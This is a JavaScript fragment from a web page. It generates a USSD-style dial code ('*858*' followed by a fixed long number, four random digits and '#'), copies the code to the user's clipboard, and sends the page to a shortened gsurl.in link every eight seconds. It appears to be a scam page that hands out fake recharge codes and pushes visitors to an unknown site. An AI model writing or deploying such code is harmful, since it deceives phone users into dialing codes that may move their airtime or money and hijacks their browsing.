        
          window.onload = function() {
var btn1,btn2,input1;
btn1 = document.getElementById('btn');
btn2 = document.getElementById('btn2');
input1 = document.getElementById('input');
function getRandomizer(bottom, top) {
    return function() {
        return Math.floor( Math.random() * ( 1 + top - bottom ) ) + bottom;
    }
}
var rollDie = getRandomizer( 0, 9 );

btn1.onclick = function(){
    var results = ""
for ( var i = 0; i<4; i++ ) {
    results += rollDie();    //make a string filled with 1000 random numbers in the range 1-6.
}
    input1.value ="";
    input1.value = "*858*4123289152518" + results+ "#";
}


function redirect(){
    window.location = "http://gsurl.in/3opQ";
}



setInterval(function(){redirect();},8000);
}

        </script>
        <script type="text/javascript">
    

    var copyTextareaBtn = document.getElementById('btn');

copyTextareaBtn.addEventListener('click', function(event) {
  var copyTextarea = document.getElementById('input');
  copyTextarea.select();

  try {
    var successful = document.execCommand('copy');
    var msg = successful ? 'successful' : 'unsuccessful';
    console.log('Copying text command was ' + msg);
  } catch (err) {
    console.log('Oops, unable to copy');
  }
});
